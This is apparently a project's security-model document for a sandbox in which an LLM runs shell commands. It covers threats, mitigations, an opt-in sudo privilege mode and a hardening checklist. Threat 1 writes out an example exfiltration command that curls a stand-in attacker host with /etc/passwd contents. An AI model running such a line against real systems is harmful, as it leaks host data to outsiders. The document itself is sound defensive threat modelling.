# Security Model

This document describes what the sandbox is and isn't, the threat surface,
and the controls that ship in the box. Read this before exposing the
service on a public network.

## Status — v2.4 (post-audit, released)

The v1.x release was a pet project. v2.x is production-shaped. v2.3 was
the first wave-2 audit approval. v2.4.0 closed three
sandbox-recommendations from the bot-side Qwen 3.8-Max review of the
combined `llama.cpp_telegram` + `bash-sandbox` deployment. v2.4.1 is a
release-prep patch — see the CHANGELOG.

| Control | v1 | v2.4 | Notes |
|---------|----|------|-------|
| `import re` in agent_api.py | ❌ missing | ✅ present | v1 would crash on every successful command |
| Path-traversal protection in `cwd` | ❌ none | ✅ `os.path.realpath` + workspace whitelist | blocks `..` and symlinks |
| Bearer-token auth on proxy | ❌ none | ✅ `OPENAPI_PROXY_TOKEN` (constant-time compare) | required, proxy 503s if unset |
| Bearer-token auth on sandbox-agent | ❌ none | ✅ `AGENT_TOKEN` (mirrored from `OPENAPI_PROXY_TOKEN`) | required, agent 503s if unset |
| CORS allowlist | ❌ `["*"]` | ✅ opt-in via `OPENAPI_PROXY_CORS_ORIGINS` | off by default |
| Container runs as non-root | ❌ `user: root` | ✅ `user: 1000:1000` | |
| `read_only` root filesystem | ❌ `false` | ✅ `true` + tmpfs for `/tmp`, `/run` | |
| Dropped capabilities | ❌ default | ✅ `cap_drop: [ALL]` | no caps re-added |
| `no-new-privileges` | ❌ off | ✅ on | blocks setuid binaries |
| Resource limits | ❌ none | ✅ `mem_limit`, `cpus`, `pids_limit` | kills fork-bombs at 256 PIDs |
| SSH host allowlist | ❌ `accept-new` for any host | ✅ `OPENAPI_PROXY_SSH_ALLOWLIST` (CIDR/hostname) | empty = disabled |
| SSH `-o` option whitelist | ❌ | ✅ `SSH_SAFE_OPTIONS` (10 safe keys) | LocalCommand / LocalForward / DynamicForward all rejected |
| SSH `-i` identity file | ❌ | ✅ refused outright (v2.11.0) | a path check cannot be made atomic with the call that opens the file |
| Per-WebSocket session | ❌ shared global | ✅ unique `ws-<hex>` per connection | closes cross-user leak |
| WebSocket idle timeout | ❌ | ✅ `OPENAPI_PROXY_WEBSOCKET_IDLE_TIMEOUT` (default 300s) | forgotten tabs no longer pin a tmux session |
| WebSocket token via subprotocol only | ❌ | ✅ `Sec-WebSocket-Protocol: bearer.<token>` | query-param token rejected, no reverse-proxy log leak |
| Singleton httpx client | ❌ per-request TCP handshake | ✅ `lifespan` + connection pool | fixes ephemeral-port exhaustion |
| /capture endpoint (no shell wrapper) | ❌ | ✅ | WebSocket poll no longer spawns bash per tick |
| Persistent session registry | ❌ in-memory only | ✅ JSON file on `/workspace` | survives container restart |
| Startup reaper for stale sessions | ❌ | ✅ `_reap_dead_sessions` in lifespan | phantom sessions removed on boot |
| Structured logging | ❌ | ✅ JSON-formatted `logger.info` with sid/cmd_len/cmd_preview/exit/duration | audit-ready |
| Command preview in log (cmd content) | ❌ | ✅ `cmd=%r` (200-char preview + `+N bytes` suffix), secret-shaped values redacted | sandbox-recommendations #C1, review #H1 |
| Rate limiting | ❌ | ✅ token-bucket per token, LRU-evicted | `OPENAPI_PROXY_RATE_LIMIT_RPM`, `OPENAPI_PROXY_RATE_LIMIT_MAX_KEYS` |
| Open WebUI DB in named volume | ❌ bind-mount into `/workspace` | ✅ `open-webui-data` named volume | LLM can no longer `rm -rf` the chat DB |
| Coverage threshold in CI | ❌ | ✅ `--cov-fail-under=70` | fails build if drops |
| Ruff B-rules SAST in CI | ❌ | ✅ `ruff check . --select B` | replaces Bandit |
| Gitleaks secret scan in CI | ❌ | ✅ | |
| CodeQL (default setup) | ❌ | ✅ GitHub-managed, runs on every push | |
| Multi-stage Dockerfiles | ❌ | ✅ | |
| Secrets in `.env` (not in compose) | ❌ in compose | ✅ `.env.example` template ships | |
| Uvicorn graceful shutdown | ❌ SIGKILL | ✅ `timeout-graceful-shutdown=25`, `stop_grace_period=30s` | |
| All `__version__` strings in lockstep | ❌ drift | ✅ `test_agent_version_matches_proxy_version` tripwire | prevents stale `/openapi.json` version |

## What you get out of the box (v2.4)

| Control                              | Status                                          |
|--------------------------------------|-------------------------------------------------|
| `read_only: true`                    | Enabled — writes go through bind-mounts + tmpfs |
| `user: 1000:1000`                    | Non-root inside the container                   |
| `cap_drop: [ALL]`                    | All capabilities dropped                         |
| `no-new-privileges: true`            | Enabled                                         |
| `mem_limit`, `cpus`, `pids_limit`    | Set in compose                                  |
| Bearer-token auth on proxy           | Required (`OPENAPI_PROXY_TOKEN`)                |
| CORS allowlist                       | Opt-in (off by default)                          |
| Rate limit (default 120 rpm)         | Configurable                                    |
| SSH host allowlist                   | Configurable (CIDR/hostname, empty=disabled)    |
| Persistent session registry          | JSON file on `/workspace`                       |
| Structured JSON logging              | stdout, audit-friendly                          |
| Network isolation between containers| All three share `agent-net` bridge              |
| External network access              | **Unrestricted** (intentional)                  |
| Authentication on Open WebUI         | `WEBUI_AUTH=true` (default)                     |
| Secret rotation                      | Manual — `.env` file (not in git)               |

## Threat model

**Trusted:**

* The host running Docker.
* The user who can run `docker compose` / edit the compose file.
* Your SearXNG and whisper-api backends (out of scope).

**Untrusted:**

* The LLM and any prompt it has been fed, including user input.
* Anyone who can talk to Open WebUI's HTTP port (3001) without
  authenticating if you've misconfigured `WEBUI_AUTH`.
* Anyone who can reach `openapi-proxy:8090` **with** a valid bearer token
  (e.g. a compromised Open WebUI instance). The token is shared between
  the UI and the proxy — there is no per-user enforcement at the proxy
  layer.

## Threats and mitigations

### 1. LLM exfiltrates data over the network

The LLM has full outbound network access. It can `curl https://attacker.example/$(hostname; cat /etc/passwd)`
and you have no visibility.

**Mitigations:**

* Run the stack on a host with egress filtering (firewall, proxy).
* Run inside a network namespace with no external route.
* Set `mem_limit` and `pids_limit` so a runaway process is contained.

### 2. LLM reads host files outside the workspace

The `cwd` parameter in `POST /sessions` is symlink-resolved and must
lie inside the workspace root. Anything outside returns 400. The only
files visible to the sandbox are:

* `/workspace` (bind-mount — controlled by you)
* `/home/agent` (the image itself — the code lives there, and **no
  volume is mounted there**; a volume there would shadow the code with
  the copy seeded on the first deploy)
* `/opt/search` (read-only bind-mount)
* `/home/agent/.ssh` (read-only bind-mount)
* `/var/cache/apt`, `/home/agent/.cache/pip` (named volumes)

The `read_only: true` root filesystem + dropped caps prevent writes
to anywhere else. The LLM runs as UID 1000, and it cannot modify
bind-mounted host files or write outside tmpfs.

The privilege mode (section 9) is the one exception, and it is opt-in:
a command can become root inside the container, and with
`AGENT_READ_ONLY=false` that root can write to the container's own
filesystem. It still cannot reach anything outside the container —
the boundary does not move.

### 3. LLM uses the SSH key to access your fleet

`/home/agent/.ssh` is mounted read-only. The LLM cannot modify keys on
the host. It **can** use them to authenticate to other hosts.

The v2.1 release adds a per-host allowlist via `OPENAPI_PROXY_SSH_ALLOWLIST`
which restricts the `ssh <host>` shortcut. Direct `ssh` invocations from
inside the sandbox still bypass this — that's by design (the LLM is
inside a real shell). Mitigations:

* Use dedicated, scoped keys in `/opt/agent-workspace/.ssh/`.
* If you don't need outbound SSH, remove the mount entirely.
* Treat the agent's SSH identity as semi-trusted.
* The shortcut refuses `-i <identity>` (v2.11.0): an identity path
  cannot be validated atomically with the ssh call that opens it, so
  the flag is not offered rather than checked and raced.

### 4. LLM fills the disk

`mem_limit: 2g`, `pids_limit: 256`, and a `read_only` root filesystem
mitigate most disk-fill attacks. The only writable surface is the
`/workspace` bind-mount, which is on your host filesystem. If you
want to bound it, put `/opt/agent-workspace` on its own filesystem
with a quota.

### 5. LLM spawns long-running processes

`tmux` keeps them alive forever. They consume memory and PIDs.

**Mitigations:**

* `pids_limit: 256` caps total processes in the container.
* `mem_limit: 2g` caps total memory.
* Add a periodic janitor that kills tmux sessions older than N hours
  (not yet implemented — see [docs/CONFIGURATION.md](CONFIGURATION.md)
  for how to add it as a cron job).

### 6. Token leak via `TOOL_SERVER_CONNECTIONS`

The `TOOL_SERVER_CONNECTIONS` env var in `docker-compose.yml` embeds
the `OPENAPI_PROXY_TOKEN` so Open WebUI can authenticate. Anyone with
`docker inspect` on the Open WebUI container can extract it.

**Mitigations:**

* Treat the Open WebUI container as sensitive (root-only access).
* Rotate the token by editing `.env` and running
  `docker compose up -d --force-recreate open-webui openapi-proxy`.
* For multi-tenant deployments, swap Open WebUI's shared token for
  per-user JWTs (out of scope for this repo).

### 7. Cross-user data leak via WebSocket

In v1 the WebSocket endpoint used a fixed `session_id = "openwebui-ws"`,
so two users opening the terminal would see each other's output. v2.1
generates a unique `ws-<hex>` per connection and tears down the
tmux session when the connection closes.

### 8. The file door (`/files`, `/files/meta`, `DELETE /files`)

The binary door hands out the raw bytes of a workspace file, and
`DELETE /files` removes one. Two things about it:

* **It is not a security boundary.** The workspace scope is hygiene: the
  model already has a shell in the same workspace and can read and remove
  the same files with `cat` and `rm`. Anyone who can call `/files` with a
  valid token could already run `rm`.
* **It is a destructive capability, and the bearer token is the only
  guard.** A token holder can delete files in the workspace. That is
  intentional — the sandbox is a scratchpad, and the delivery path
  removes the file it delivered — and it is bounded by the workspace
  scope: outside it the delete is refused with a 400, and a symlink
  pointing out of the workspace is resolved and refused before anything
  is removed.

The file door is deliberately **not** rate limited: a per-minute request
budget would break a chunked transfer for a reason that has nothing to
do with the transfer. The bearer token and the workspace scope are the
controls.

The door also **tells the truth about permissions**. It opens the file
before the response starts, so a file the agent's own process cannot
read — one a root-owned command created with `umask 077` — is a **403**
with a message that names the cause, not a 200 that promises N bytes
and then delivers none. The alternative is worse than ugly: the client
sees a short read, calls it a broken connection, and blames the
side-car for being unreachable when the side-car is perfectly fine.

### 9. The privilege mode: `sudo su` inside the sandbox

> **This is for private deployments in secured environments only.**
> A stock deployment must not turn it on. The sandbox runs code whose
> input may be hostile — a prompt injection that reaches the shell is
> the threat model of every other section in this document — and the
> privilege mode gives that code **root inside the container**.

Off by default. A stock image has **no `sudo`** and no setuid binary
that could help, the container runs with an **empty capability bounding
set** and **no-new-privileges** on. A command cannot become root,
because there is nothing to become root *with*.

Turning it on takes four settings. Three of them make the escalation
work at all — the first one alone is a broken half. The fourth does
not: it decides whether the root is *useful*:

| Setting | Where | What it does |
|---|---|---|
| `AGENT_ALLOW_SUDO=1` | the sandbox's environment | the image is built with `sudo` and a `NOPASSWD` rule for the agent's user |
| `AGENT_NO_NEW_PRIVILEGES=false` | the sandbox's environment | the kernel stops ignoring the setuid bit, so `sudo` can elevate at all |
| `AGENT_CAP_DROP=SYS_ADMIN` | the sandbox's environment | the capability bounding set is no longer empty, so the process can hold `CAP_SETUID` and `su` can change the user |
| `AGENT_READ_ONLY=false` | the sandbox's environment | the container's root filesystem is writable, so the root shell can actually change something |

The escalation gives the model a root shell; with a read-only root
filesystem that shell owns the filesystem and cannot change a byte of
it. `apt-get` needs three writable paths
(`/var/lib/apt/lists` for the index, `/var/lib/dpkg` for the package
database, `/usr` for the packages themselves) and gets *"Read-only file
system"* for all three. A model that tries `apt-get install` then
concludes the sandbox is broken, while the deployment is merely a
half-root. The agent announces this at startup, so the operator sees
it before the model does.

`AGENT_CAP_DROP=SYS_ADMIN` is the value to use: Docker does not grant
`CAP_SYS_ADMIN` by default, so dropping it leaves the default
capability set intact — `SETUID`, `SETGID`, `DAC_OVERRIDE` and the rest
— while still denying the one capability that would allow mounts and
namespaces.

**What it gives:** a command in the sandbox can run `sudo su` and gets a
root shell **inside the container**. That is the whole of it. The
agent's own HTTP service keeps running as uid 1000; only the model's
shell escalates. `CAP_SYS_ADMIN` is still absent, so there is no
mount, no namespace trick, and no way out of the container's own
namespaces.

**What it does not give:** the host. The container is the boundary. The
root shell can write anywhere *in the container* that the container's
own filesystem allows — including the workspace, which is a bind-mount,
so that means the files the host shares with the sandbox. It cannot
reach anything the container cannot see, and it cannot bypass the
host's own permissions on the mount.

**What a writable root filesystem changes — and what it does not.**
`AGENT_READ_ONLY=false` gives the container a writable root layer: the
root shell can install packages, edit `/etc` and modify the agent's own
files under `/home/agent`. It does **not** give the host. The
container's namespaces, capabilities, devices and mounts are exactly
what they were, `CAP_SYS_ADMIN` is still absent, and the writable layer
is the container's own — it is discarded when the container is
recreated, so a modified `/usr` does not survive a redeploy. The
boundary is the container, and the boundary did not move.

The stock deployment keeps the root filesystem read-only, and a
deployment that wants the privilege mode should decide deliberately
which half of "root" it wants: escalation, usefulness, or both.

**Verify it after turning it on:**

```bash
docker exec <agent> sh -c 'sudo -n id'      # uid=0(root)
docker logs <agent> | grep -i 'privilege mode'
```

And if the root is meant to be *useful*, verify that too — a root that
cannot write is a half-root:

```bash
docker exec <agent> sh -c 'sudo -n apt-get update'   # E: Read-only file system → the rootfs is read-only
```

**One setting inside sudo is load-bearing.** Sudo runs the command in a
pseudo-terminal of its own by default, and when that pty is torn down the
terminal is reset — and the reset wipes the completion marker the exec
protocol depends on. The command succeeds, its output is right there in
the pane, and the exec still times out and reports nothing. The
sandbox therefore sets `Defaults !use_pty` for sudo, so the command runs
in the same terminal and the marker survives.

That is a property of the exec protocol, not of sudo: **any command that
allocates its own pty** — `less`, `top`, `vim`, `ssh` to a host that
allocates one — resets the terminal the same way. The sandbox's
completion detection reads the painted screen, and a screen that was
reset does not have the marker on it. It is not implemented here (the
robust answer is to read the raw output stream instead of the painted
screen), but it is worth knowing before you conclude that a command
"did nothing" when it actually ran.

**A note on `sudo su` itself.** `sudo su` is an *interactive* root
shell: it takes over the pane and never returns, so the exec times out
the way any interactive command does (`bash`, `python3` without `-c`).
A one-shot root command is `sudo -n su -c 'id'` — or simply
`sudo -n <command>`, which is what the sandbox's own rule is for.

The agent logs a warning at startup when `sudo` is present: either
that the mode is on, or — if the posture does not allow it — exactly
which of the two runtime settings is still in the way. A silent
failure here is the worst outcome: the model would report *"sudo: the
'no new privileges' flag is set"* and the operator would look for a
broken sandbox instead of a missing setting.

**Before you turn it on, read:** the hardening checklist below, and
the trust model section — a root shell in the sandbox is still a
single-token, single-operator design.

### 10. A command cannot read the terminal's input

The agent types a command into an interactive shell and reads the result
out of the pane. The bookkeeping lines that follow the command — the
line that captures its exit code and the line that prints the completion
marker — sit in the terminal's input buffer while the command runs.

Before v2.10.2 a command could read that buffer. `read x` waited for
input and consumed the marker; `apt-get` did the same, and the caller
got a timeout instead of an answer. The command was not attacking
anything: it was reading the only stdin it had.

Now the command runs inside a brace group whose stdin is `/dev/null`. It
reads EOF, the bookkeeping stays in the buffer where the command cannot
reach it, and the answer comes back.

Two consequences worth knowing:

* A command that wants input gets EOF. `cat` with no argument returns
  empty instead of hanging, and an interactive program (`top`, `vim`)
  exits instead of taking over the pane. That is the right answer for
  a one-shot tool, and it is a change: before, those commands ran until
  the exec limit expired.
* A command that contains a brace bash would read as a group delimiter
  (`echo }`) is run unwrapped, exactly as before. Wrapping it would
  change what it means, and a command that means something else is worse
  than a command that waits.

### 11. The log keeps the command — and the command may carry a secret

Every executed command is logged with a 200-character preview of its
text, so that an operator can reconstruct what the model ran. A command
that carries a credential — `export API_KEY=…`, `curl -H "Authorization:
Bearer …"`, `mysql --password …`, `sshpass -p …`, a pasted private key
— would otherwise put that credential into the log file.

**Mitigations:**

* The preview is redacted before it is logged (v2.11.0): the values of
  assignments, flags and `name: value` pairs whose name looks secret,
  the value of an `Authorization:` header, the value of `sshpass -p`
  and PEM private-key blocks are replaced with `[REDACTED]`. The names
  stay, so the log still says what the command was doing.
* The redaction is a safety net, not a guarantee: it matches *shapes*,
  not *meaning*. A credential in a shape it does not know (a bare token
  as a positional argument, say) still reaches the log. Treat the
  agent's log as sensitive and keep it out of places where it does not
  belong.
* The command's *output* is not logged — only its text — so a secret
  the model prints does not reach the log through this path.

## What's intentionally not implemented

* **Streaming a file that is not finished.** The door serves files that
  exist, completely, on disk. A download in flight, or a file still being
  written, has no URL here — the producer materialises it first. A
  "stateless binary" mode, where a live stream is teed straight out to
  the client, is not implemented: the channel it would travel in (the
  model's tool result) is text and context-sized, so the bytes would not
  fit there anyway.
* **User-level isolation at the sandbox layer.** All chats share the
  same `sandbox-agent` container, which means all users share the
  same tmux server. Open WebUI generates unique `session_id`s per
  chat, but a determined user could guess another user's `session_id`
  and `tmux attach` to it. Per-user containers is the only complete
  mitigation; that's out of scope here.
* **Per-user auth on the proxy.** A single bearer token is shared
  across all users. Multi-tenant auth would need a JWT layer with
  user identity and per-user rate limits.
* **Docker secrets / HashiCorp Vault for the bearer token.** The
  `OPENAPI_PROXY_TOKEN` lives in a `.env` file with mode 0600. For
  a single-operator personal deployment this is fine: the threat
  model is "someone with shell on my host reads my .env", and that
  operator is already past the line. For a multi-tenant / hosted
  deployment, swap the `environment:` block in compose for a
  `secrets:` mount of `/run/secrets/...`. The bot side
  (`personal_tools/bash_command.py`) needs a matching change to
  read from `/run/secrets/`; coordinate before shipping.
* **Per-sandbox session LRU eviction.** The bot's `session_id` is
  deterministic (`chat-{chat_id}`), so the natural upper bound is
  "one session per chat" — i.e. O(chats), not unbounded. If the
  bot's session_id scheme ever changes (per-user-id, per-message-id,
  stateless shells), the right place to add LRU eviction is the
  bot's `call_llama.py` (it knows the scheme), not here.
* **The SSH shortcut is a guardrail, not a boundary.** Its host
  allowlist and its flag whitelist apply to the `ssh <host>` shortcut
  only. Inside the sandbox the model has a real shell, so `ssh` can be
  invoked in any other form and the allowlist does not apply — that is
  by design (section 3). What actually keeps the operator's key away
  from the model is the permissions of the read-only key mount: a key
  the agent's user cannot read is a key `ssh` cannot use either.
  Until v2.11.0 the shortcut also accepted `-i <path>` after a
  workspace-scope check. That check was a path check in the proxy,
  while the file was opened later by `ssh` in the sandbox — a race the
  old code itself documented as exploitable — so the flag is now
  refused outright.
* **Seccomp/AppArmor.** Not configured. Add a profile in production.

## Trust model (explicit — single operator)

This stack is designed for the **single-operator** deployment shape:

```
   ┌─────────────────────────────────────────────────────┐
   │  One admin who owns:                                │
   │   • the Open WebUI instance                         │
   │   • the bearer token in TOOL_SERVER_CONNECTIONS     │
   │   • the AGENT_TOKEN env var on the sandbox-agent    │
   │   • the /opt/agent-workspace directory               │
   │   • all SSH keys mounted into the sandbox            │
   └─────────────────────────────────────────────────────┘
                          │
                          ▼
   The bearer token, the workspace, the SSH keys and the agent
   are all in the same trust boundary. Anyone with the token can
   do anything the admin can do.
```

If you need **multi-tenant**, the right shape is:

* one Open WebUI instance per user (or a proper auth proxy in front)
* one `sandbox-agent` per user, with its own `AGENT_TOKEN` and
  `/workspace`
* one bearer token per user
* per-user rate limits keyed on the user identity, not the token

We do not implement that here. Bolting multi-tenant auth onto this
single-token design would be a security anti-pattern — better to fork
or re-architect.

## Hardening checklist (for production)

- [ ] Copy `.env.example` to `.env`, fill in real secrets from
      `openssl rand -hex 32` and `openssl rand -base64 48`
- [ ] Set `ENABLE_SIGNUP=false` and create users manually
- [ ] Set `OPENAPI_PROXY_CORS_ORIGINS` if you serve a browser UI
- [ ] Set `OPENAPI_PROXY_SSH_ALLOWLIST` to your actual fleet
- [ ] Add a periodic janitor for old tmux sessions
- [ ] Put `/opt/agent-workspace` on a separate filesystem with a quota
- [ ] Enable Docker user namespaces (`/etc/subuid` + `userns-remap`)
- [ ] Run behind a reverse proxy (Caddy/Traefik) with TLS
- [ ] Pipe JSON logs to your log aggregator
- [ ] Set up a Prometheus scrape for `uvicorn` access logs (out of
      scope for this repo — add an exporter)
